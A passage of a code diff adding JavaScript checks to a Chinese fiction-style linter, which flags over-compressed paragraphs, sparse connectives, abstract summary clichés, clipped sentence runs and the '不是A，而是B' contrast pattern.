+  if (narrativeChars < OVERCOMPRESSED_PROSE_MIN_CHARS || narrativeParas < OVERCOMPRESSED_PROSE_MIN_PARAS) return [];
+  const shortRatio = shortParas / narrativeParas;
+  if (shortRatio < OVERCOMPRESSED_PROSE_SHORT_RATIO) return [];
+  const particlePerKilo = (particles / narrativeChars) * 1000;
+  if (particlePerKilo >= OVERCOMPRESSED_PROSE_PARTICLE_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'overcompressed-prose-tic',
+    severity: 'advisory',
+    message: `过度精炼短段：叙述段 ${narrativeParas} 个，其中 ${shortParas} 个≤${OVERCOMPRESSED_PROSE_SHORT_MAX_CHARS}字（${(shortRatio * 100).toFixed(0)}%），自然连接 ${particlePerKilo.toFixed(1)}/千字偏少；先通读判断，确有提纲感再补断裂处和必要结构虚词，有意短镜头可留，别机械注水。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+
+}
+
+// 低连接密度：长文本/中短窗口里，引号外叙述的功能词和白话连接同时偏低，且缺少中长承接句，
+// 会呈现“提纲/电报体”分布。修法是恢复必要连接和句群，不是全局补词。
+function findLowConnectiveDensityTic(proseLines) {
+  let bodyChars = 0;
+  let functionHits = 0;
+  let plainHits = 0;
+  let firstLine = null;
+  const sentences = [];
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+
+    // 只看引号外叙述。台词/弹幕/系统播报可以天然短促，混入统计会把体裁特征误当电报体。
+    const narrative = stripQuoted(trimmed).trim();
+    const narrativeLen = visibleLength(narrative);
+    if (narrativeLen === 0) continue;
+
+    if (firstLine === null) firstLine = lineNo;
+    bodyChars += narrativeLen;
+    functionHits += countTerms(narrative, LOW_CONNECTIVE_FUNCTION_TERMS);
+    plainHits += countTerms(narrative, LOW_CONNECTIVE_PLAIN_TERMS);
+
+    for (const sentence of splitSentences(narrative)) {
+      const len = visibleLength(sentence);
+      if (len === 0) continue;
+      sentences.push(len);
+      if (len <= 12 && samples.length < 6) samples.push(sentence);
+    }
+  }
+
+  if (bodyChars < LOW_CONNECTIVE_MIN_CHARS || sentences.length === 0) return [];
+  const functionPerKilo = (functionHits / bodyChars) * 1000;
+  if (functionPerKilo >= LOW_CONNECTIVE_FUNCTION_PER_KILO) return [];
+  const plainPerKilo = (plainHits / bodyChars) * 1000;
+  if (plainPerKilo >= LOW_CONNECTIVE_PLAIN_PER_KILO) return [];
+  const longSentenceRatio = sentences.filter((len) => len >= LOW_CONNECTIVE_LONG_SENTENCE_CHARS).length / sentences.length;
+  if (longSentenceRatio >= LOW_CONNECTIVE_LONG_SENTENCE_RATIO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'low-connective-density-tic',
+    severity: 'advisory',
+    message: `低连接密度：引号外叙述功能词 ${functionPerKilo.toFixed(1)}/千字、白话连接 ${plainPerKilo.toFixed(1)}/千字，且≥${LOW_CONNECTIVE_LONG_SENTENCE_CHARS}字承接句仅 ${(longSentenceRatio * 100).toFixed(0)}%；容易像提纲/电报体。通读后补必要连接和中长句群，别机械注水。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+// 抽象总结复读：统计引号外叙述中的高抽象收束模板。全篇只报一条，提醒回到角色
+// 当下可见的文件、动作、对话或物理后果；不要用命运大词替读者总结。
+function findAbstractSummaryTic(proseLines) {
+  let hits = 0;
+  let narrativeChars = 0;
+  let firstLine = null;
+  const samples = [];
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed || isDivider(trimmed) || isStructural(trimmed)) continue;
+    const narrative = stripQuoted(trimmed);
+    narrativeChars += visibleLength(narrative);
+
+    for (const pattern of ABSTRACT_SUMMARY_PATTERNS) {
+      pattern.lastIndex = 0;
+      let match;
+      while ((match = pattern.exec(narrative)) !== null) {
+        hits += 1;
+        if (firstLine === null) firstLine = lineNo;
+        const sample = compact(match[0]);
+        if (samples.length < 6 && !samples.includes(sample)) samples.push(sample);
+      }
+    }
+  }
+
+  if (narrativeChars === 0 || hits < ABSTRACT_SUMMARY_MIN_HITS) return [];
+  const perKilo = (hits / narrativeChars) * 1000;
+  if (perKilo < ABSTRACT_SUMMARY_PER_KILO) return [];
+
+  return [{
+    line: firstLine,
+    column: 1,
+    type: 'abstract-summary-tic',
+    severity: 'advisory',
+    message: `抽象总结复读：命运/棋局/这一刻终于明白/才刚刚开始等作者总结 ${hits} 处（${perKilo.toFixed(1)}/千字）；回到角色当下可见的文件、动作、对话或物理后果，别替读者盖章。`,
+    excerpt: compact(samples.join(' | ')),
+  }];
+}
+
+function findPeriodStutter(proseLines) {
+  const findings = [];
+  let runLen = 0;
+  let runStartLine = null;
+  let runSample = [];
+
+  const flush = () => {
+    if (runLen >= STUTTER_MIN_RUN) {
+      findings.push({
+        line: runStartLine,
+        column: 1,
+        type: 'period-stutter',
+        severity: 'advisory',
+        message: `碎句号：连续 ${runLen} 个短句无呼吸；按目标句长把碎句合并成中长句、补回画面与连接（见本 skill 句长/疏密节奏规则）。`,
+        excerpt: compact(runSample.join(' ')),
+      });
+    }
+    runLen = 0;
+    runStartLine = null;
+    runSample = [];
+  };
+
+  for (const { text, lineNo } of proseLines) {
+    const trimmed = text.trim();
+    if (!trimmed) continue; // 空行是一句一段排版，不打断叙述连贯
+    if (isDivider(trimmed) || isStructural(trimmed)) {
+      flush(); // 分隔线/markdown 结构行：重置碎句计数
+      continue;
+    }
+    const narrative = stripQuoted(trimmed);
+    if (visibleLength(narrative) === 0) {
+      flush(); // 纯对话/弹幕/系统播报：成片短句是正常形态，重置碎句计数
+      continue;
+    }
+    // 只数引号外叙述句：混合行（叙述+引号内物件/短台词）的引号外片段仍参与碎句计数。
+    for (const sentence of splitSentences(narrative)) {
+      if (visibleLength(sentence) <= STUTTER_MAX_SENTENCE) {
+        if (runLen === 0) runStartLine = lineNo;
+        runLen += 1;
+        if (runSample.length < 6) runSample.push(sentence);
+      } else {
+        flush();
+      }
+    }
+  }
+  flush();
+  return findings;
+}
+
+function isDivider(trimmed) {
+  return /^-{3,}$/.test(trimmed) || /^[*_]{3,}$/.test(trimmed);
+}
+
+// markdown 结构行（标题/列表/引用/表格）不是叙述正文，长段落/碎句号/破折号检测都跳过。
+function isStructural(trimmed) {
+  return /^(#{1,6}\s|>\s?|[-*+]\s|\d+[.)]\s|\|)/.test(trimmed)
+    || /^第[零一二三四五六七八九十百千万\d]+章(?:\s|_|$)/.test(trimmed);
+}
+
+// 去掉成对引号内的片段（台词/系统播报），只留引号外叙述。碎句号判定用：纯对话/弹幕成片短句
+// 是体裁正常形态（豁免），但「叙述 + 引号内物件/短台词」混合行的引号外叙述仍要参与短句计数。
+function stripQuoted(text) {
+  let out = text;
+  for (const src of QUOTE_SOURCES) out = out.replace(new RegExp(src, 'g'), '');
+  return out;
+}
+
+// 把成对引号片段（含引号）替换为等长问号占位：既豁免引号内台词/播报，又保住原文
+// 偏移量，供逐处 blocking 规则定位与截取原文摘录（stripQuoted 会移位，不适合定位）。
+// 占位字符用「？」而不是「。」：占位既要截断各规则的 [^。！？!?…] 否定类（？与句号在每条
+// 规则的否定类里等效），又不能落在任何规则的接受位。句号占位会替 trailer-summary 的句末
+// [。！] 伪造出终止符，让「这一战注定是「血屠」的开端，…」这类引号里放代号/绰号的叙述行
+// 被误报，且报出的『这一战注定是。』在原文里 grep 不到。占位长度不变，故偏移与摘录窗口不漂移。
+function maskQuoted(text) {
+  let out = text;
+  for (const src of QUOTE_SOURCES) {
+    out = out.replace(new RegExp(src, 'g'), (m) => '？'.repeat(m.length));
+  }
+  return out;
+}
+
+// 返回引号内片段（含引号本身）的 [start, end) 区间，供 not-is 对比句豁免台词用。
+function quotedRanges(text) {
+  const ranges = [];
+  for (const src of QUOTE_SOURCES) {
+    const re = new RegExp(src, 'g');
+    let match;
+    while ((match = re.exec(text)) !== null) ranges.push([match.index, match.index + match[0].length]);
+  }
+  return ranges;
+}
+
+function insideRanges(pos, ranges) {
+  return ranges.some(([start, end]) => pos >= start && pos < end);
+}
+
+function splitSentences(trimmed) {
+  return trimmed
+    .split(/[。！？!?]/)
+    .map((s) => s.trim())
+    .filter(Boolean);
+}
+
+function sentenceAround(text, index) {
+  let start = index;
+  while (start > 0 && !STOP_CHARS.has(text[start - 1])) start -= 1;
+  let end = index;
+  while (end < text.length && !STOP_CHARS.has(text[end])) end += 1;
+  return compact(text.slice(start, end).trim());
+}
+
+function visibleLength(sentence) {
+  const matched = sentence.match(/[一-鿿Ａ-ｚA-Za-z0-9]/g);
+  return matched ? matched.length : 0;
+}
+
+function countTerms(text, terms) {
+  let count = 0;
+  for (const term of terms) {
+    let index = text.indexOf(term);
+    while (index !== -1) {
+      count += 1;
+      index = text.indexOf(term, index + term.length);
+    }
+  }
+  return count;
+}
+
+function parseFenceMarker(trimmedLine) {
+  const match = /^(?:`{3,}|~{3,})/.exec(trimmedLine);
+  if (!match) return null;
+  return { char: match[0][0], length: match[0].length };
+}
+
+function hasYamlFrontMatter(lines) {
+  if (!lines[0] || lines[0].trim() !== '---') return false;
+  let sawYamlField = false;
+  for (let i = 1; i < Math.min(lines.length, 40); i += 1) {
+    const trimmed = lines[i].trim();
+    if (trimmed === '---') return sawYamlField;
+    if (/^[A-Za-z0-9_-]+:\s*/.test(trimmed)) sawYamlField = true;
+  }
+  return false;
+}
+
+function scanBlock(block) {
+  const text = block.map((entry) => entry.text).join('\n');
+  const lineStarts = [];
+  let cursor = 0;
+
+  for (const entry of block) {
+    lineStarts.push({ offset: cursor, lineNo: entry.lineNo });
+    cursor += entry.text.length + 1;
+  }
+
+  return findNotIsComparisons(text, (offset) => positionForOffset(lineStarts, offset));
+}
+
+function positionForOffset(lineStarts, offset) {
+  let low = 0;
+  let high = lineStarts.length - 1;
+
+  while (low <= high) {
+    const mid = Math.floor((low + high) / 2);
+    const current = lineStarts[mid];
+    const next = lineStarts[mid + 1];
+
+    if (offset < current.offset) {
+      high = mid - 1;
+    } else if (next && offset >= next.offset) {
+      low = mid + 1;
+    } else {
+      return {
+        line: current.lineNo,
+        column: offset - current.offset + 1,
+      };
+    }
+  }
+
+  return { line: lineStarts[0].lineNo, column: 1 };
+}
+
+function findNotIsComparisons(text, getPosition) {
+  const findings = [];
+  const quoted = quotedRanges(text);
+  let offset = 0;
+
+  while (offset < text.length) {
+    const start = text.indexOf('不是', offset);
+    if (start === -1) break;
+
+    // 引号内是台词/系统播报：口语里「不是A，是B」是自然辩解/反问，不算叙述层 AI 对比句式
+    // （与碎句号一致豁免引号内容）。
+    if (insideRanges(start, quoted)) {
+      offset = start + 2;
+      continue;
+    }
+
+    // Avoid the common yes/no question fragment “是不是”.
+    if (start > 0 && text[start - 1] === '是') {
+      offset = start + 2;
+      continue;
+    }
+
+    const candidate = text.slice(start);
+    const markerEnd = findPositiveFlipEnd(candidate);
+
+    if (markerEnd === -1) {
+      offset = start + 2;
+      continue;
+    }
+
+    const raw = trimTrailingNoise(extractFinding(candidate, markerEnd));
+    if (raw.length >= 4) {
+      const position = getPosition(start);
+      findings.push({
+        line: position.line,
+        column: position.column,
+        type: 'not-is-comparison',
+        severity: 'blocking',
+        message: '高频 AI 对比句式；删掉否定铺垫，直接写后项，或改成动作/细节呈现。',
+        excerpt: compact(raw),
+      });
+    }
+
+    offset = start + Math.max(raw.length, 2);
+  }
+
+  return findings;
+}
+
+function findPositiveFlipEnd(candidate) {
+  let index = 2; // after “不是”
+  let scanned = 0;
+  let crossedSeparator = false;
+
+  while (index < candidate.length && scanned <= MAX_NEGATIVE_SPAN) {
+    const char = candidate[index];
+
+    if (startsWithAt(candidate, index, '而是')) return index + 2;
+
+    if (SOFT_SEPARATORS.has(char)) {
+      const next = skipGap(candidate, index + 1);
+      if (startsWithAt(candidate, next, '而是')) return next + 2;
+      if (candidate[next] === '是' && !TAG_PARTICLES.has(candidate[next + 1]) && !isAffirmationTagAt(candidate, next)) return next + 1;
+      crossedSeparator = true;
+    }
+
+    if (HARD_SEPARATORS.has(char)) {
+      const next = skipGap(candidate, index + 1);
+      if (candidate[next] === '是' && !TAG_PARTICLES.has(candidate[next + 1]) && !isAffirmationTagAt(candidate, next)) return next + 1;
+      if (char !== '.') break;
+      crossedSeparator = true;
+    }
+
+    if (STOP_CHARS.has(char)) break;
+
+    // Catch compact forms such as “不是A是B”, but only within the first clause —
+    // before any separator. After a separator the trailing “是” of a conjunction
+    // (只是/可是/但是/还是/于是/倒是/总是…) is part of that word, not a positive
+    // copula (issue #166 false-positive class). Post-separator flips are still
+    // caught when separator-adjacent (“，是”/“，而是”) by the separator branches
+    // above; subject-present flips like “，他是”/“，那是” are intentionally NOT
+    // caught here — there is no separator-local way to tell them from a
+    // conjunction without a word list, and on a hard rescan-to-0 gate a false
+    // positive (forcing a rewrite of good prose) costs more than missing this
+    // rarer form. The “是” in the either-or idiom “不是A就是B / 也是B” is part of
+    // the 就是/也是 conjunction, not a copula, so 就/也 are excluded too. Also never
+    // treat the “是” inside a second negative fragment (“不是A，也不是B”) as the flip.
+    if (char === '是' && !COMPACT_EITHER_OR_PREV.has(candidate[index - 1]) && !crossedSeparator) {
+      return index + 1;
+    }
+
+    index += 1;
+    scanned += 1;
+  }
+
+  return -1;
+}
+
+function extractFinding(candidate, markerEnd) {
+  let end = markerEnd;
+  const limit = Math.min(candidate.length, markerEnd + MAX_POSITIVE_SPAN);
+
+  while (end < limit) {
+    if (STOP_CHARS.has(candidate[end])) break;
+    end += 1;
+  }
+
+  return candidate.slice(0, end);
+}
+
+function startsWithAt(text, index, needle) {
+  return text.slice(index, index + needle.length) === needle;
+}
+
+function isAffirmationTagAt(text, index) {
+  if (text[index] !== '是') return false;
+  const particle = text[index + 1];
+  if (!AFFIRMATION_TAG_PARTICLES.has(particle)) return false;
+  const boundary = text[index + 2] || '';
+  return AFFIRMATION_TAG_BOUNDARY.has(boundary);
+}
+
+// 跳过行内空白与换行（含空行/段落间距），停在下一个实义字符。原实现只吞一个换行，
+// 会漏掉跨空行的「不是A。（空行）是B」这类分段揭示句。
+function skipGap(text, index) {
+  while (index < text.length && (isInlineSpace(text[index]) || text[index] === '\n')) index += 1;
+  return index;
+}
+
+function isInlineSpace(char) {
+  return char === ' ' || char === '\t' || char === '\r';
+}
+
+function trimTrailingNoise(text) {
+  return text.replace(/[\s|）)】\]]+$/u, '');
+}
+
+function compact(text) {
+  const normalized = text.replace(/\s+/g, ' ').trim();
+  return normalized.length > 80 ? `${normalized.slice(0, 77)}...` : normalized;
+}
